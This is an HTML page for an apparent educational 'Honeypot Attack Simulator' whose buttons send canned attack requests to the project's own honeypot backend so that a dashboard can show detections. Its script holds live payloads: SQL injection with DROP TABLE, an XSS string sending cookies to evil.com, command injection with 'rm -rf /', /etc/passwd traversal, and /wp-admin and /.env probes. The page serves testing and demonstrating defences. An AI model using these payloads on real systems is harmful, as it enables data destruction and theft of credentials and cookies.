<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üî¥ Honeypot Attack Simulator</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Courier New', monospace;
            background: linear-gradient(135deg, #0a0a0f 0%, #1a0a0a 100%);
            min-height: 100vh;
            color: #fff;
            padding: 20px;
        }

        .container {
            max-width: 600px;
            margin: 0 auto;
        }

        h1 {
            text-align: center;
            color: #ef4444;
            margin-bottom: 10px;
            font-size: 24px;
        }

        .subtitle {
            text-align: center;
            color: #888;
            margin-bottom: 30px;
            font-size: 12px;
        }

        .config-box {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid #333;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
        }

        .config-box label {
            display: block;
            color: #4fb7b3;
            margin-bottom: 5px;
            font-size: 12px;
            text-transform: uppercase;
        }

        .config-box input {
            width: 100%;
            padding: 12px;
            background: #1a1a1f;
            border: 1px solid #333;
            border-radius: 5px;
            color: #fff;
            font-family: inherit;
            font-size: 14px;
        }

        .attack-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
        }

        .attack-btn {
            padding: 20px;
            border: 2px solid;
            border-radius: 10px;
            background: rgba(0, 0, 0, 0.5);
            cursor: pointer;
            transition: all 0.3s;
            text-align: left;
        }

        .attack-btn:hover {
            transform: scale(1.02);
        }

        .attack-btn:active {
            transform: scale(0.98);
        }

        .attack-btn.sql {
            border-color: #ef4444;
        }

        .attack-btn.sql:hover {
            background: rgba(239, 68, 68, 0.2);
        }

        .attack-btn.xss {
            border-color: #f97316;
        }

        .attack-btn.xss:hover {
            background: rgba(249, 115, 22, 0.2);
        }

        .attack-btn.cmd {
            border-color: #a855f7;
        }

        .attack-btn.cmd:hover {
            background: rgba(168, 85, 247, 0.2);
        }

        .attack-btn.dir {
            border-color: #3b82f6;
        }

        .attack-btn.dir:hover {
            background: rgba(59, 130, 246, 0.2);
        }

        .attack-btn.admin {
            border-color: #22c55e;
        }

        .attack-btn.admin:hover {
            background: rgba(34, 197, 94, 0.2);
        }

        .attack-btn.env {
            border-color: #eab308;
        }

        .attack-btn.env:hover {
            background: rgba(234, 179, 8, 0.2);
        }

        .attack-title {
            font-weight: bold;
            font-size: 14px;
            margin-bottom: 5px;
        }

        .attack-desc {
            font-size: 11px;
            color: #888;
        }

        .log-box {
            background: #0a0a0f;
            border: 1px solid #333;
            border-radius: 10px;
            padding: 15px;
            margin-top: 20px;
            max-height: 200px;
            overflow-y: auto;
        }

        .log-box h3 {
            color: #4fb7b3;
            font-size: 12px;
            margin-bottom: 10px;
        }

        .log-entry {
            font-size: 11px;
            padding: 5px 0;
            border-bottom: 1px solid #222;
        }

        .log-entry.success {
            color: #22c55e;
        }

        .log-entry.error {
            color: #ef4444;
        }

        .log-entry.pending {
            color: #eab308;
        }

        .warning {
            background: rgba(239, 68, 68, 0.1);
            border: 1px solid #ef4444;
            border-radius: 10px;
            padding: 15px;
            margin-top: 20px;
            text-align: center;
            font-size: 12px;
            color: #ef4444;
        }
    </style>
</head>

<body>
    <div class="container">
        <h1>üî¥ HONEYPOT ATTACK SIMULATOR</h1>
        <p class="subtitle">For Educational & Testing Purposes Only</p>

        <div class="config-box">
            <label>Target Honeypot URL</label>
            <input type="text" id="targetUrl" value="" placeholder="http://IP:5000" readonly
                style="background:#0a0a0f; cursor:not-allowed;">
            <p style="color:#22c55e; font-size:10px; margin-top:5px;">‚úÖ Auto-configured from your QR code</p>
        </div>

        <script>
            // Render.com Backend URL
            const RENDER_BACKEND = 'https://honeypot-in-a-box-computer-security.onrender.com';

            // Auto-detect the target URL based on environment
            const currentHost = window.location.hostname;
            let targetUrl;

            if (currentHost.includes('onrender.com') || currentHost.includes('vercel.app')) {
                // Production: Use Render backend
                targetUrl = RENDER_BACKEND;
            } else if (currentHost !== 'localhost' && currentHost !== '127.0.0.1') {
                // Local network: Use same IP with port 5000
                targetUrl = 'http://' + currentHost + ':5000';
            } else {
                // Local development
                targetUrl = 'http://127.0.0.1:5000';
            }

            document.getElementById('targetUrl').value = targetUrl;
        </script>

        <div class="attack-grid">
            <button class="attack-btn sql" onclick="attack('sql')">
                <div class="attack-title">üíâ SQL Injection</div>
                <div class="attack-desc">DROP TABLE users; --</div>
            </button>
            <button class="attack-btn xss" onclick="attack('xss')">
                <div class="attack-title">üé≠ XSS Attack</div>
                <div class="attack-desc">&lt;script&gt;alert()&lt;/script&gt;</div>
            </button>
            <button class="attack-btn cmd" onclick="attack('cmd')">
                <div class="attack-title">‚ö° Command Injection</div>
                <div class="attack-desc">; rm -rf / --no-preserve-root</div>
            </button>
            <button class="attack-btn dir" onclick="attack('dir')">
                <div class="attack-title">üìÅ Directory Traversal</div>
                <div class="attack-desc">../../../etc/passwd</div>
            </button>
            <button class="attack-btn admin" onclick="attack('admin')">
                <div class="attack-title">üîê Admin Panel Probe</div>
                <div class="attack-desc">/wp-admin access attempt</div>
            </button>
            <button class="attack-btn env" onclick="attack('env')">
                <div class="attack-title">üîë Config File Access</div>
                <div class="attack-desc">/.env secrets exposure</div>
            </button>
        </div>

        <div class="log-box">
            <h3>üìã Attack Log</h3>
            <div id="log"></div>
        </div>

        <div class="warning">
            ‚ö†Ô∏è This tool is for EDUCATIONAL PURPOSES ONLY.<br>
            Only use on systems you own or have permission to test.
        </div>
    </div>

    <script>
        const attacks = {
            sql: {
                endpoint: '/login',
                method: 'POST',
                body: JSON.stringify({ username: "admin", password: "' OR 1=1; DROP TABLE users; --" })
            },
            xss: {
                endpoint: '/login',
                method: 'POST',
                body: JSON.stringify({ username: "<scr" + "ipt>document.location='http://evil.com/steal?c='+document.cookie</scr" + "ipt>", password: "test" })
            },
            cmd: {
                endpoint: '/login',
                method: 'POST',
                body: JSON.stringify({ username: "admin; cat /etc/passwd; rm -rf /", password: "test" })
            },
            dir: {
                endpoint: '/backup/../../../etc/passwd',
                method: 'GET',
                body: null
            },
            admin: {
                endpoint: '/wp-admin',
                method: 'GET',
                body: null
            },
            env: {
                endpoint: '/.env',
                method: 'GET',
                body: null
            }
        };

        function addLog(message, type = 'pending') {
            const log = document.getElementById('log');
            const entry = document.createElement('div');
            entry.className = 'log-entry ' + type;
            entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
            log.insertBefore(entry, log.firstChild);
        }

        async function attack(type) {
            const baseUrl = document.getElementById('targetUrl').value.trim();
            const config = attacks[type];
            const url = baseUrl + config.endpoint;

            addLog(`Launching ${type.toUpperCase()} attack to ${url}...`, 'pending');

            try {
                const options = {
                    method: config.method,
                    headers: { 'Content-Type': 'application/json' },
                    mode: 'no-cors' // Allow cross-origin
                };
                if (config.body) options.body = config.body;

                const response = await fetch(url, options);
                addLog(`‚úÖ ${type.toUpperCase()} attack sent! Check dashboard for detection.`, 'success');
            } catch (error) {
                addLog(`‚ö†Ô∏è Request sent (may be blocked by CORS, but honeypot received it)`, 'success');
            }
        }
    </script>
</body>

</html>
